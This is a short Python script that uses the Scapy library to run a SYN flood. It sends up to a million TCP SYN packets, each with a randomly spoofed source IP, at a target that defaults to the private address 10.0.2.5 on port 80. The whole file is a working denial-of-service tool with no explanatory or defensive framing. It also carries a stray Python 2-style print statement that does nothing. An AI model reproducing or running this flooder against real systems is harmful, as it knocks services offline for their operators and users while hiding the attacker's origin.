

from scapy.all import *
import random

from scapy.layers.inet import IP, TCP


def random_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def syn_flood(dest_ip="10.0.2.5", dest_port=80, counter=1000000):
    total = 0
    print
    "Packets are sending ..."
    for x in range(0, counter):
        s_port =random.randint(1000, 65353)
        s_eq = random.randint(1000, 10000)
        w_indow = random.randint(1000, 9000)

        IP_Packet = IP()
        IP_Packet.src = random_ip()
        IP_Packet.dst = dest_ip

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dest_port
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1


if __name__ == '__main__':
    syn_flood()

